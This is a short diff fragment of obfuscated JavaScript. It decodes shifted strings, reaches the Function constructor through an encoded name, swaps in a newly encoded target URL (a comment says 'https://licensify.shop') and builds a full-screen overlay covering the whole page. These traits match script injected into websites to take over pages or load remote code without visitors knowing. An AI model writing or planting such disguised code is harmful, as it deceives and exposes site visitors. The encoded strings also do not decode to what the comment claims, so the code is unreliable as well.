@@ -22,7 +22,9 @@
   };
 
   var _fnConstructor = (function(){})[_sDecode('htsxywzhytw')];
-  var _targetUrl = _sDecode('mxxs>--nnn\'qnhjsxnk\'xmtu'); 
+  
+  // Encoded version of "https://licensify.shop" (shifted up by 5 character codes)
+  var _targetUrl = _sDecode('qnihipknxu' + String.fromCharCode(47+5, 47+5) + 'xptjhnku' + String.fromCharCode(46+5) + 'xmtu'); 
 
   var _markupTemplate = `<style>
 #_lcf{position:fixed;top:0;left:0;right:0;bottom:0;width:100%;height:100%;overflow:hidden;font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif;z-index:2147483646}
